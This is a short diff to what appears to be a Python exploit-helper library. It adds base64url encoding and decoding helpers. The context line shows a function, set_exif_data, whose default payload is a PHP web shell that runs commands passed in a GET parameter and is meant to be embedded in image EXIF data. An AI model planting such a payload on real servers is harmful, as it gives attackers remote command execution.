@@ -266,7 +266,16 @@ def xor(a, b):
     return b"".join([bytes([c1 ^ c2]) for (c1,c2) in zip(a, b) ])
 
 def base64urldecode(data):
+    if isinstance(data, str):
+        data = data.encode()
+
     return base64.urlsafe_b64decode(data + b'=' * (4 - len(data) % 4))
+
+def base64urlencode(data):
+    if isinstance(data, str):
+        data = data.encode()
+
+    return base64.urlsafe_b64encode(data)
 
 def set_exif_data(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None, _format=None):
     import exif
